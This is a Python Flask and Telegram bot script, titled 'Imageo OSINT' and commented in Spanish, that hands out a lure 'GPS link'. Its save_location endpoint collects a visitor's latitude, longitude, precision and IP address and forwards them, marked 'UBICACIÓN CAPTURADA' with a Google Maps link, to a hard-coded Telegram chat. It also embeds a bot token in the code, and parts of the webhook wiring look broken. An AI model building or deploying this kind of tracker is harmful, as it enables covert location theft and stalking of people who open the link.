from flask import Flask, request, jsonify, send_from_directory
import os
import uuid
import requests
from telegram import Update
from telegram.ext import Application, CommandHandler, MessageHandler, filters, ContextTypes
from telegram.ext import ApplicationHandlerStop
import asyncio
import logging

app = Flask(__name__)

BOT_TOKEN = os.environ.get('TELEGRAM_BOT_TOKEN', '8605186812:AAET8973lR2dwBr10G_hsw2jbL6yaxLvBPI')
CHAT_ID = os.environ.get('CHAT_ID', '7891650726')
UPLOAD_FOLDER = 'uploads'
WEBHOOK_URL = 'https://imageo-mm44.onrender.com/webhook'  # Tu URL de Render

if not os.path.exists(UPLOAD_FOLDER):
    os.makedirs(UPLOAD_FOLDER)

logging.basicConfig(level=logging.INFO)

# Bot handlers
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text(
        f"🔥 Imageo OSINT Bot\n\n"
        f"Enlace GPS: https://dancing-tiramisu-fc6a7a.netlify.app/\n\n"
        f"Envía foto para procesar."
    )

async def share_image(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.message.photo:
        photo = await update.message.photo[-1].get_file()
        photo_bytes = await photo.download_as_bytearray()
        files = {'file': ('image.jpg', photo_bytes, 'image/jpeg')}
        response = requests.post(f"http://localhost:5000/upload", files=files)  # Local para webhook
        await update.message.reply_text("✅ Foto procesada. Usa el enlace GPS arriba.")
    else:
        await update.message.reply_text("📸 Envía foto.")

# Webhook endpoint para Telegram
@app.route('/webhook', methods=['POST'])
async def webhook():
    update = Update.de_json(request.get_json(), app.bot)
    await app.application.process_update(update)
    return 'OK'

# Inicializar bot
application = Application.builder().token(BOT_TOKEN).build()
application.add_handler(CommandHandler("start", start))
application.add_handler(MessageHandler(filters.PHOTO, share_image))

@app.route('/')
def home():
    return "✅ Imageo OSINT - Bot + GPS activo", 200

@app.route('/guardar_y_notificar', methods=['POST'])
def save_location():
    lat = request.form.get('lat', 'N/A')
    lon = request.form.get('lon', 'N/A')
    precision = request.form.get('precision', 'N/A')
    fecha = request.form.get('fecha', 'N/A')
    ip = request.remote_addr

    mensaje = f"🎯 UBICACIÓN CAPTURADA\n📍 Lat: {lat}\n📍 Lon: {lon}\n📏 {precision}m\n⏰ {fecha}\n🌐 IP: {ip}\n🗺️ https://www.google.com/maps?q={lat},{lon}"

    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
    requests.post(url, data={'chat_id': CHAT_ID, 'text': mensaje})
    return "OK", 200

@app.route('/upload', methods=['POST'])
def upload_file():
    file = request.files['file']
    filename = f"{uuid.uuid4()}.jpg"
    file_path = os.path.join(UPLOAD_FOLDER, filename)
    file.save(file_path)
    return jsonify({'url': f'/static/{filename}'}), 200

@app.route('/static/<path:filename>')
def serve_static(filename):
    return send_from_directory(UPLOAD_FOLDER, filename)

if __name__ == '__main__':
    # Configurar webhook
    asyncio.run(application.bot.set_webhook(WEBHOOK_URL))
    app.run(host='0.0.0.0', port=int(os.environ.get('PORT', 5000)))